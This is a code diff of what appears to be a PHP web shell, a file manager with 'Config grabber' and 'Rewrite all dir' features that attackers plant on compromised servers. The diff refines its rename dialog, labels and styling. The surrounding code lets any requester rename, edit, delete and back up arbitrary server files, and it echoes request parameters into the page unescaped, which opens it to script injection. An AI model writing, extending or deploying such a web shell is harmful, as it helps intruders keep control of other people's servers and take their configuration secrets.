@@ -645,6 +645,9 @@ class XN {
             }
         }
     }
+    public static function replace($filename) {
+        return str_replace(array(' ', '.', ':', '-' , '(', ')'), '', $filename);
+    }
     public static function formatSize( $bytes ){
         $types = array( 'Byte', 'KB', 'MB', 'GB', 'TB' );
         for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
@@ -719,7 +722,7 @@ function head($x, $y, $class = null) {
                             <a><i class="fas fa-reply-all"></i></a>
                         </div>
                         <div class="font">
-                            <?= basename($_SERVER['DOCUMENT_ROOT']) ?>
+                            Home root
                         </div>
                     </button>
                 </li>
@@ -729,7 +732,7 @@ function head($x, $y, $class = null) {
                             <a><i class="fas fa-info-circle"></i></a>
                         </div>
                         <div class="font">
-                            Server Info
+                            Server info
                         </div>
                     </button>
                 </li>
@@ -759,7 +762,7 @@ function head($x, $y, $class = null) {
                             <a><i class="fas fa-file-medical"></i></a>
                         </div>
                         <div class="font">
-                            Add File
+                            Add file
                         </div>
                     </button>
                 </li>
@@ -769,7 +772,7 @@ function head($x, $y, $class = null) {
                             <a><i class="fas fa-folder-plus"></i></a>
                         </div>
                         <div class="font">
-                            Add Folder
+                            Add folder
                         </div>
                     </button>
                 </li>
@@ -779,7 +782,7 @@ function head($x, $y, $class = null) {
                             <a><i class="fa fa-cog" aria-hidden="true"></i></a>
                         </div>
                         <div class="font">
-                            Config Grabber
+                            Config grabber
                         </div>
                     </button>
                 </li>
@@ -813,7 +816,7 @@ function head($x, $y, $class = null) {
                             <a><i class="fas fa-exclamation-triangle"></i></a>
                         </div>
                         <div class="font">
-                            Rewrite All Dir
+                            Rewrite all dir
                         </div>
                     </button>
                 </li>
@@ -825,7 +828,7 @@ function head($x, $y, $class = null) {
                             <a><i class="fa fa-info-circle" aria-hidden="true"></i></a>
                         </div>
                         <div class="font">
-                            About Me
+                            About me
                         </div>
                     </button>
                 </li>
@@ -1246,7 +1249,10 @@ function alert($message) {
         background: #d6d6d6;
     }
     .toggle {
-        padding-right: 6;
+        padding:10px;
+        border: 1px solid #ebebeb;
+        background: #ebebeb;
+        margin-bottom: 3px;
     }
     ul.dropdown {
         display: none;
@@ -1435,11 +1441,33 @@ function alert($message) {
     .blocker.behind {
         background-color: transparent;
     }
+    .modal-rename {
+        display: none;
+        vertical-align: middle;
+        position: relative;
+        z-index: 2;
+        max-width:500px;
+        box-sizing: border-box;
+        background: #fff;
+        -webkit-border-radius: 7px;
+        -moz-border-radius: 7px;
+        -o-border-radius: 7px;
+        -ms-border-radius: 7px;
+        border-radius: 7px;
+        box-shadow: 0 3px 6px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
+        text-align: left;
+    }
+    .modal-rename input,
+    .modal-rename button {
+        margin-bottom:3px;
+        width:100%;
+    }
     .modal {
         display: none;
         vertical-align: middle;
         position: relative;
         z-index: 2;
+        min-width:350px;
         max-width:500px;
         box-sizing: border-box;
         background: #fff;
@@ -1728,7 +1756,7 @@ function filterTable() {
             $("#alert_overlay").height($(document).height());  
         }  
     }  
-</script>  
+</script>
 <center>
 <div class="files">
     <?php
@@ -2047,127 +2075,12 @@ function filterTable() {
             exit();
             break;
         case 'rename':
-            if (isset($_POST['rename'])) {
-                if (@rename($_POST['file'], getcwd() . DIRECTORY_SEPARATOR . $_POST['newname'])) {
-                    echo "<script>$(location).attr('href', ?x=".getcwd().")</script>";
-                } else {
-                    alert("Rename Failed");
-                }
+            if (@rename($_POST['file'], getcwd() . DIRECTORY_SEPARATOR . $_POST['newname'])) {
+                print("<script>window.location='?x=".getcwd()."'</script>");
+            } else {
+                print("<script>window.location='?x=".getcwd()."&failed=Rename'</script>");
             }
-            head("Rename", getcwd(), 'hidden');
-            ?>
-            <div class="rename">
-                <table>
-                    <tr>
-                        <td>
-                            Filename
-                        </td>
-                        <td>:</td>
-                        <td>
-                            <div class="rename_name">
-                                <?= XN::wr(basename($_POST['file']), basename($_POST['file']), 2) ?>
-                            </div>
-                        </td>
-                    </tr>
-                    <tr>
-                        <?php
-                        switch ($_POST['file']) {
-                            case is_dir($_POST['file']):
-                                ?>
-                                <td>
-                                    Items
-                                </td>
-                                <td>:</td>
-                                <td>
-                                    <?= XN::countDir($_POST['file']) ?> items
-                                </td>
-                                <?php
-                                break;
-                            default:
-                                ?>
-                                <td>
-                                    Size
-                                </td>
-                                <td>:</td>
-                                <td>
-                                    <?= XN::size($_POST['file']) ?>
-                                </td>
-                                <?php
-                                break;
-                        }
-                        ?>
-                    </tr>
-                    <tr>
-                        <td>
-                            Last Modif
-                        </td>
-                        <td>:</td>
-                        <td>
-                            <?= XN::ftime($_POST['file']) ?>
-                        </td>
-                    </tr>
-                    <tr>
-                        <form method="post">
-                            <td colspan="3">
-                                <?php
-                                switch ($_POST['file']) {
-                                    case is_dir($_POST['file']):
-                                        ?>
-                                        <button name="action" value="delete">Delete</button>
-                                        <button disabled>Rename</button>
-                                        <?php
-                                        break;
-                                    case is_file($_POST['file']):
-                                        switch (XN::getext($_POST['file'])) {
-                                            case 'ico':
-                                            case 'png':
-                                            case 'jpg':
-                                            case 'jpeg':
-                                            case 'svg':
-                                            case 'gif':
-                                            case 'gif':
-                                            case 'webp':
-                                                ?>
-                                                <button name="action" value="delete">Delete</button>
-                                                <button disabled>Rename</button>
-                                                <?php
-                                                break;
-                                            
-                                            default:
-                                                ?>
-                                                <button name="action" value="edit">Edit</button>
-                                                <button name="action" value="delete">Delete</button>
-                                                <button disabled>Rename</button>
-                                                <button name="action" value="backup">Backup</button>
-                                                <?php
-                                                break;
-                                        }
-                                        break;
-                                }
-                                ?>
-                            </td>
-                            <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
-                        </form>
-                    </tr>
-                    <form method="post" action="?x=<?= getcwd() ?>">
-                        <tr>
-                            <td colspan="3">
-                                <input type="text" name="newname" value="<?= basename($_POST['file']) ?>">
-                            </td>
-                        </tr>
-                        <tr>
-                            <td colspan="3">
-                                <input type="submit" name="rename" value="Change">
-                                <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
-                                <input type="hidden" name="action" value="rename">
-                            </td>
-                        </tr>
-                    </form>
-                </table>
-            </div>
-            <?php
             exit();
-            break;
         case 'edit':
             if (isset($_POST['save'])) {
                 if (XN::save($_POST['file'], $_POST['data'])) {
@@ -2240,6 +2153,9 @@ function filterTable() {
             exit;
             break;
     }
+    if (@$_GET['failed']) {
+        alert("".$_GET['failed']." failed");
+    }
     head(basename(getcwd()), dirname(getcwd()));
     ?>
     <div class="storage">
@@ -2253,7 +2169,8 @@ function filterTable() {
     <div class="table">
     <table id="myTable">
         <?php
-        foreach (XN::files('dir') as $dir) { ?>
+        foreach (XN::files('dir') as $dir) { 
+            ?>
             <tr>
                 <td class="border1 hover">
                     <div class="block">
@@ -2295,12 +2212,27 @@ function filterTable() {
                                     <button name="action" value="delete">Delete</button>
                                 </li>
                                 <li>
-                                    <button name="action" value="rename">Rename</button>
+                                    <a href="#rename<?= XN::replace($dir['names']) ?>" rel="modal:open">Rename</a>
                                 </li>
                                 <input type="hidden" name="file" value="<?= $dir['name'] ?>">
                             </form>
                         </ul>
                     </nav>
+                    <!-- Action Rename -->
+                    <div id="rename<?= XN::replace($dir['names']) ?>" class="modal modal-rename">
+                        <div class="rename">
+                            <h2>Rename</h2>
+                            <form method="post" action="?x=<?= getcwd() ?>">
+                                <div>
+                                    <input type="text" name="newname" value="<?= $dir['names'] ?>">
+                                </div>
+                                <div>
+                                    <button name="action" value="rename">Rename</button>
+                                </div>
+                                <input type="hidden" name="file" value="<?= $dir['name'] ?>">
+                            </form>
+                        </div>
+                    </div>
                 </td>
             </tr>
         <?php }
@@ -2368,7 +2300,7 @@ function filterTable() {
                                             <button name="action" value="delete">Delete</button>
                                         </li>
                                         <li>
-                                            <button name="action" value="rename">Rename</button>
+                                            <a href="#rename<?= XN::replace($file['names']) ?>" rel="modal:open">Rename</a>
                                         </li>
                                         <?php
                                         break;
@@ -2381,7 +2313,7 @@ function filterTable() {
                                             <button name="action" value="delete">Delete</button>
                                         </li>
                                         <li>
-                                            <button name="action" value="rename">Rename</button>
+                                            <a href="#rename<?= XN::replace($file['names']) ?>" rel="modal:open">Rename</a>
                                         </li>
                                         <?php
                                         break;
@@ -2402,7 +2334,7 @@ function filterTable() {
                                             <button name="action" value="delete">Delete</button>
                                         </li>
                                         <li>
-                                            <button name="action" value="rename">Rename</button>
+                                            <a href="#rename<?= XN::replace($file['names']) ?>" rel="modal:open">Rename</a>
                                         </li>
                                         <?php
                                         break;
@@ -2416,7 +2348,7 @@ function filterTable() {
                                             <button name="action" value="delete">Delete</button>
                                         </li>
                                         <li>
-                                            <button name="action" value="rename">Rename</button>
+                                            <a href="#rename<?= XN::replace($file['names']) ?>" rel="modal:open">Rename</a>
                                         </li>
                                         <li>
                                             <button name="action" value="backup">Backup</button>
@@ -2429,6 +2361,21 @@ function filterTable() {
                             </form>
                         </ul>
                     </nav>
+                    <!-- Action Rename -->
+                    <div id="rename<?= XN::replace($file['names']) ?>" class="modal modal-rename">
+                        <div class="rename">
+                            <h2>Rename</h2>
+                            <form method="post" action="?x=<?= getcwd() ?>">
+                                <div>
+                                    <input type="text" name="newname" value="<?= $file['names'] ?>">
+                                </div>
+                                <div>
+                                    <button name="action" value="rename">Rename</button>
+                                </div>
+                                <input type="hidden" name="file" value="<?= $file['name'] ?>">
+                            </form>
+                        </div>
+                    </div>
                 </td>
             </tr>
         <?php }
